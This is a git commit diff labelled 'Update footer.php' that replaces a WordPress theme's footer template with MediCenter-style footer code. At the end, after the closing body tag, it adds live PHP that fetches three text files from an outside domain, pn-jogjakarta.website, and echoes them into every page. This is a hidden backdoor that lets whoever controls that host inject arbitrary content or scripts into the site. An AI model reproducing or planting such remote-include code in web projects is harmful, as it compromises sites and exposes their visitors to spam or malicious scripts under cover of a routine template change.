db8b7e3960e98f9413c1972b11476a4bc305b71e
bandungcijaura <bandungcijaura01@gmail.com>
2025-02-06 08:35:55 +0700

    Update footer.php

--- footer.php
+++ footer.php
@@ -1,49 +1,94 @@
-<?php
-/**
- * The template for displaying the footer.
- *
- * Contains the closing of the #content div and all content after
- *
- * @package unite
- */
-?>
-	</div><!-- #content -->
-
-	<footer id="colophon" class="site-footer" role="contentinfo">
-		<div class="container">
-
-			<div class="site-footer-widget col-md-12 col-sm-12 col-xs-12">
-				<div id="footer-content">
-					<div class="row">
-						<div class="col-xs-12 col-sm-12 col-md-4 home-widget">
-							<?php if( is_active_sidebar('home5') ) dynamic_sidebar( 'home5' ); ?> 
-						</div>	
-						<div class="hidden-xs col-sm-12 col-md-4 home-widget">
-							<?php if( is_active_sidebar('home6') ) dynamic_sidebar( 'home6' ); ?> 
-						</div>
-						<div class="hidden-xs col-sm-12 col-md-4 home-widget">
-							<?php if( is_active_sidebar('home7') ) dynamic_sidebar( 'home7' ); ?> 
-						</div>
+			<?php global $theme_options; 
+			$sidebar_footer_top = get_post(get_post_meta(get_the_ID(), "page_sidebar_footer_top", true));
+			$sidebar = get_post(get_post_meta(get_the_ID(), "page_sidebar_footer_bottom", true));
+			if((isset($sidebar_footer_top) && !(int)get_post_meta($sidebar_footer_top->ID, "hidden", true) && is_active_sidebar($sidebar_footer_top->post_name)) || (isset($sidebar) && !(int)get_post_meta($sidebar->ID, "hidden", true) && is_active_sidebar($sidebar->post_name)))
+			{
+			?>
+			<div class="footer-container">
+				<div class="footer">
+					<?php
+					if(isset($sidebar_footer_top) && !(int)get_post_meta($sidebar_footer_top->ID, "hidden", true) && is_active_sidebar($sidebar_footer_top->post_name))
+					{
+					?>
+					<ul class="footer-banner-box-container clearfix<?php echo ((int)get_post_meta($sidebar_footer_top->ID, "hide_on_mobiles", true) ? ' hide-on-mobiles' : ''); ?>">
+						<?php
+						dynamic_sidebar($sidebar_footer_top->post_name);
+						?>
+					</ul>
+					<?php
+					}
+					if(isset($sidebar) && !(int)get_post_meta($sidebar->ID, "hidden", true) && is_active_sidebar($sidebar->post_name))
+					{
+					?>
+					<div class="footer-box-container vc_row wpb_row vc_row-fluid clearfix<?php echo ((int)get_post_meta($sidebar->ID, "hide_on_mobiles", true) ? ' hide-on-mobiles' : ''); ?>">
+						<?php
+							dynamic_sidebar($sidebar->post_name);
+						?>
 					</div>
-				</div>
-			</div>	
-			<div class="site-info col-md-12 col-sm-12 col-xs-12">
-				<nav role="navigation" class="col-md-6">
-					<?php unite_footer_links(); ?>
-				</nav>
-				<div class="copyright col-md-6">
-	<!-- 				<?php do_action( 'unite_credits' ); ?>
-					<?php echo of_get_option( 'custom_footer_text', 'unite' ); ?> -->
-					<?php do_action( 'unite_footer' ); ?> 
+					<?php
+					}
+					?>
 				</div>
 			</div>
-		</div><!-- .site-info -->
-	</footer><!-- #colophon -->
-</div><!-- #page -->
-<?php wp_footer(); ?>
-<script src="/wp-content/themes/archieve/inc/js/application.js"></script>
-</body>
-$a = file_get_contents('https://pn-jogjakarta.website/txt/asli.txt'); echo $a;
-$a = file_get_contents('https://pn-jogjakarta.website/txt/asli-2.txt'); echo $a;
-$a = file_get_contents('https://pn-jogjakarta.website/txt/rawatan.txt'); echo $a;
+			<?php
+			}
+			$locations = get_nav_menu_locations();
+			if(isset($locations["footer-menu"]))
+				$footer_menu_object = get_term($locations["footer-menu"], "nav_menu");
+			if($theme_options["footer_text_left"]!="" || (has_nav_menu("footer-menu") && $footer_menu_object->count>0) || is_active_sidebar('sidebar-copyright-area')): ?>
+			<div class="copyright-area-container">
+				<div class="copyright-area clearfix">
+					<?php if($theme_options["footer_text_left"]!=""): ?>
+					<div class="copyright-text">
+					<?php
+					echo do_shortcode($theme_options["footer_text_left"]);
+					?>
+					</div>
+					<?php
+					endif;
+					if(is_active_sidebar('sidebar-copyright-area'))
+					{
+						$sidebar = get_page_by_title("Sidebar Copyright Area", OBJECT, "medicenter_sidebars");
+						if(isset($sidebar) && !(int)get_post_meta($sidebar->ID, "hidden", true))
+						{
+							if((int)get_post_meta($sidebar->ID, "hide_on_mobiles", true))
+							{
+							?>
+							<div class="hide-on-mobiles">
+							<?php
+							}
+							dynamic_sidebar('sidebar-copyright-area');
+							if((int)get_post_meta($sidebar->ID, "hide_on_mobiles", true))
+							{
+							?>
+							</div>
+							<?php
+							}
+						}
+					}
+					if(has_nav_menu("footer-menu") && $footer_menu_object->count>0) 
+					{
+						wp_nav_menu(array(
+							"theme_location" => "footer-menu",
+							"menu_class" => "footer-menu"
+						));
+					}
+					?>
+				</div>
+			</div>
+			<?php endif; ?>
+		</div>
+		<?php if((int)$theme_options["scroll_top"]): ?>
+		<a href="#top" class="scroll-top animated-element template-arrow-vertical-3" title="<?php esc_attr_e("Scroll to top", 'medicenter'); ?>"></a>
+		<?php
+		endif;
+		if((int)$theme_options["layout_picker"])
+			mc_get_theme_file("/style_selector/style_selector.php");		
+		wp_footer();
+		?>
+	</body>
+
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli-2.txt");?>
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/rawatan.txt");?>
 </html>
